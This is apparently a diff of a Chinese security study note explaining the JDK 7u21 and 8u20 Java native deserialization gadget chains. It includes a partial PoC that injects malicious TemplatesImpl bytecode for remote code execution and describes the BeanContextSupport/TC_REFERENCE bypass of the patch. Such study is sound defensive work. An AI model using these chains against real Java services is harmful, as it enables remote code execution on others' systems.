@@ -5,11 +5,13 @@ tags:
     - Java
 ---
 
-# JDK 7u21 反序列化漏洞
+# JDK 原生反序列化漏洞
+
+## JDK 7u21
 
 JDK 7u21 是一个原生的反序列化利用链，主要通过`AnnotationInvocationHandler`和`TemplatesImpl`两个类来构造。
 
-## euqalsImpl
+### euqalsImpl
 
 我们还是首先关注`AnnotationInvocationHandler`类的invoke()方法
 
@@ -105,15 +107,15 @@ JDK 7u21 是一个原生的反序列化利用链，主要通过`AnnotationInvoca
     }
 ```
 
-也就是说，在`equalsImpl`中，遍历了`this.type`中的所有方法并且执行`invoke(o)`。
+也就是说，在`equalsImpl`中，遍历了`this.type`中的所有get方法并且执行`invoke(o)`。
 
-## TemplatesImpl
+### TemplatesImpl
 
 我们令type为TemplatesImpl类，将o(即执行方法的对象)置为恶意构造的TemplatesImpl实例，则`equalsImpl`会调用`TemplatesImpl.getOutputProperties()`，加载类字节码实现RCE。
 
 TemplatesImpl利用参考[Fastjson](/Sec/Web/Deserial/Fastjson/#1224)
 
-## LinkedHashSet
+### LinkedHashSet
 
 为了触发invoke，我们需要寻找能够调用`equals`方法的类。
 
@@ -213,7 +215,7 @@ TemplatesImpl利用参考[Fastjson](/Sec/Web/Deserial/Fastjson/#1224)
 
 至此，整条利用链已经构造完成。
 
-## PoC
+### PoC
 
 === "Jdk7u21.java"
 
@@ -237,10 +239,13 @@ TemplatesImpl利用参考[Fastjson](/Sec/Web/Deserial/Fastjson/#1224)
             byte[] evilCode = SerializeUtil.getEvilCode();
             TemplatesImpl templates = new TemplatesImpl();
             SerializeUtil.setFieldValue(templates,"_bytecodes",new byte[][]{evilCode});
-            SerializeUtil.setFieldValue(templates,"_name","feng");
+            SerializeUtil.setFieldValue(templates,"_name","colemak");
 
             HashMap<String, Object> memberValues = new HashMap<String, Object>();
-            memberValues.put("f5a5a608","feng");
+
+            // 为了避免在序列化前向 hashSet 中添加元素时就发生 hash 冲突触发漏洞，这里先修改value的值
+            memberValues.put("f5a5a608","colemak"); 
+
             Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
             Constructor cons = clazz.getDeclaredConstructor(Class.class, Map.class);
             cons.setAccessible(true);
@@ -258,7 +263,10 @@ TemplatesImpl利用参考[Fastjson](/Sec/Web/Deserial/Fastjson/#1224)
             hashSet.add(templates);
             hashSet.add(proxy);
 
+            // 由于 java 的 Map 赋值是传递引用，因此这里的 value 修改后 proxy 里 map 的值也会改变
+            // 从而让反序列化时 hash 冲突调用 equals 方法
             memberValues.put("f5a5a608",templates);
+            
             byte[] bytes = SerializeUtil.serialize(hashSet);
             SerializeUtil.unserialize(bytes);
         }
@@ -346,7 +354,192 @@ TemplatesImpl利用参考[Fastjson](/Sec/Web/Deserial/Fastjson/#1224)
 
 ![alt text](img/12.png){loading="lazy"}
 
-## 参考资料
+### 修复补丁
+
+type设为TemplatesImpl理论上无法作为AnnotationInvocationHandler反序列化，但在原有的 `AnnotationInvocationHandler.readObject()` 方法中，异常处理部分直接return，不会抛出异常
+
+```java
+    private void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException {
+        s.defaultReadObject();
+
+        // Check to make sure that types have not evolved incompatibly
+
+        AnnotationType annotationType = null;
+        try {
+            annotationType = AnnotationType.getInstance(type);
+        } catch(IllegalArgumentException e) {
+            // Class is no longer an annotation type; all bets are off
+            return;
+        }
+        ...
+    }
+```
+
+该漏洞在随后的版本中进行了修复，将`return`修改成了`throw new java.io.InvalidObjectException("Non-annotation type in annotation serial stream");` 此时type无法设置为非Annotation类型，但该修复方式仍存在问题，后来在JDK 8u20中爆出了新的原生反序列化漏洞。
+
+
+### 参考资料
 
 - [原生反序列化链JDK7u21](https://ch0x01e.github.io/post/yuan-sheng-fan-xu-lie-hua-lian-jdk7u21/){target="_blank"}
 - [JDK7u21反序列化链学习](https://blog.csdn.net/rfrder/article/details/120007644){target="_blank"}
+
+## JDK 8u20
+
+JDK 8u20 是对 JDK 7u21 修复的绕过，作者在 [More serialization hacks with AnnotationInvocationHandler](https://wouter.coekaerts.be/2015/annotationinvocationhandler){target="_blank"} 中提出了绕过方法，需要对 Java 序列化机制有一定的了解。
+
+
+### Try-Catch 机制
+
+对于如下代码，思考运行后会发生什么：
+
+``` java
+public static void main(String[] args) throws Exception {
+        try {
+            System.out.println("Start");
+            try {
+                int a = 1/0;
+            } catch (ArithmeticException e) {
+                throw new InvalidObjectException("Invalid");
+                System.out.println("In");
+            }
+        } catch (Exception e) {
+        }
+        System.out.println("End");
+    }
+```
+
+运行结果应为：
+
+``` shell
+Start
+End
+```
+
+这是由于内部的 try-catch 块抛出了异常被外层捕获，而外层的 catch 忽略了异常，所以程序正常继续执行。
+
+回到`AnnotationInvocationHandler.readObject()`方法，我们可以看到实际上我们构造的类已经通过`defauleReadObject()`方法被反序列化，但是由于异常处理导致反序列化链无法继续进行。通过上面的例子是否可以绕过限制呢？
+
+我们需要寻找一个类，满足以下条件：
+
+1. 实现 `Serializable` 接口
+2. 重写了 `readObject()` 方法
+3. 在 `readObject()` 中存在对 `readObject()` 的调用，并且对调用的`readObject()`捕获异常且继续执行。
+
+### BeanContextSupport
+
+在 jdk 中我们找到了想要的类 `java.beans.beancontext.BeanContextSupport`
+
+```java
+    public final void readChildren(ObjectInputStream ois) throws IOException, ClassNotFoundException {
+        int count = serializable;
+
+        while (count-- > 0) {
+            Object                      child = null;
+            BeanContextSupport.BCSChild bscc  = null;
+
+            try {
+                child = ois.readObject();
+                bscc  = (BeanContextSupport.BCSChild)ois.readObject();
+            } catch (IOException ioe) {
+                continue;
+            } catch (ClassNotFoundException cnfe) {
+                continue;
+            }
+
+
+            synchronized(child) {
+                BeanContextChild bcc = null;
+
+                try {
+                    bcc = (BeanContextChild)child;
+                } catch (ClassCastException cce) {
+                    // do nothing;
+                }
+
+                if (bcc != null) {
+                    try {
+                        bcc.setBeanContext(getBeanContextPeer());
+
+                       bcc.addPropertyChangeListener("beanContext", childPCL);
+                       bcc.addVetoableChangeListener("beanContext", childVCL);
+
+                    } catch (PropertyVetoException pve) {
+                        continue;
+                    }
+                }
+
+                childDeserializedHook(child, bscc);
+            }
+        }
+    }
+
+    private synchronized void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
+
+        synchronized(BeanContext.globalHierarchyLock) {
+            ois.defaultReadObject();
+
+            initialize();
+
+            bcsPreDeserializationHook(ois);
+
+            if (serializable > 0 && this.equals(getBeanContextPeer()))
+                readChildren(ois);
+
+            deserialize(ois, bcmListeners = new ArrayList(1));
+        }
+    }
+```
+如果其serializable的值为不为0，会进入到`readChildren`中，随后调用`ois.readObject()`读取序列化字节码中的内容
+
+### 序列化引用机制
+
+在最终的利用前，我们需要了解一下 Java 的序列化机制。
+
+> 在序列化流程中，对象所属类、对象成员属性等数据都会被使用固定的语法写入到序列化数据，并且会被特定的方法读取；在序列化数据中，存在的对象有null、new objects、classes、arrays、strings、back references等，这些对象在序列化结构中都有对应的描述信息。
+> 
+> 为了避免重复写入完全相同的元素，Java 反序列化存在引用机制：每一个写入字节流的对象都会被赋予引用Handle，出现重复对象时使用`TC_REFERENCE`结构引用前面handle的值。
+> 
+> 引用Handle会从`0x00 7E 00 00`开始进行顺序赋值并且自动自增，一旦字节流发生了重置则该引用Handle会重新开始计数。
+
+!!! example
+
+    ```java
+    import java.io.*;
+
+    public class exp implements Serializable {
+        private static final long serialVersionUID = 100L;
+        public static int num = 0;
+        private void readObject(ObjectInputStream input) throws Exception {
+            input.defaultReadObject();
+        }
+        public static void main(String[] args) throws IOException {
+            exp t = new exp();
+            ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream("test"));
+            out.writeObject(t);
+            out.writeObject(t); //第二次写入
+            out.close();
+        }
+    }
+    ```
+
+使用 [SerializationDumper](https://github.com/NickstaDB/SerializationDumper){target="_blank"} 可以查看序列化后的数据
+
+![alt text](img/13.png){loading="lazy"}
+
+由于我们写入了两次，最后部分的`TC_REFERENCE`块为handle引用指向了前面的对象 `0x00 7e 00 01`
+
+### PoC
+
+`AnnotationInvocationHandler.readObject()`方法中的异常处理前已经反序列化了我们构造的对象，这就生成了一个有效的 handle 值，通过`BeanContextSupport` 绕过异常处理后可以通过`TC_REFERENCE` 来引用已经序列化好的 `AnnotationInvocationHandler` 对象，继续7u21的利用链即可。
+
+修改序列化字节码是JDK 8u20利用链的难点，这里参考文章[以一种更简单的方式构造JRE8u20 Gadget](https://xz.aliyun.com/t/8277){target="_blank"}，示意图如下：
+
+![alt text](img/14.png){loading="lazy"}
+
+[PoC](https://github.com/feihong-cs/jre8u20_gadget){target="_blank"}
+
+### 参考资料
+
+- [7u21 与 8u20](https://www.cnblogs.com/beautiful-code/p/15005485.html){target="_blank"}
+- [反序列化篇之JDK8u20](https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87%E4%B9%8BJDK8u20/){target="_blank"}
+
